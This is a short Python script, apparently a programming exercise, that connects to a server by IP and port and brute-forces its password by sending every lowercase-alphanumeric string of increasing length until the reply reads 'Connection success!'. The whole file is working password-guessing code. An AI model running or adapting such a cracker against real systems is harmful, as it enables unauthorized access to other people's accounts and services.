#  Parses the command line and gets two arguments that are IP address and port.
#  Tries different passwords until it finds the correct one.(Simple brute force)
#  Prints the password it found.


import sys
import socket
import itertools

letters = 'abcdefghijklmnopqrstuvwxyz0123456789'


conn = socket.socket()
args = sys.argv

ip_addr = args[1]
port = int(args[2])
conn.connect((ip_addr, port))

mesg = ''
i = 1
loop = True
while loop:
    for x in itertools.product(letters, repeat=i):
        for n in range(i):
           mesg = mesg + x[n]
        byt_msg = mesg.encode()
        conn.send(byt_msg)
        sevr_meg = conn.recv(1024)
        respond = sevr_meg.decode()
        if respond == 'Connection success!':
            loop = False
            print(mesg)
        mesg = ''
    i += 1


# print(respond)

conn.close()
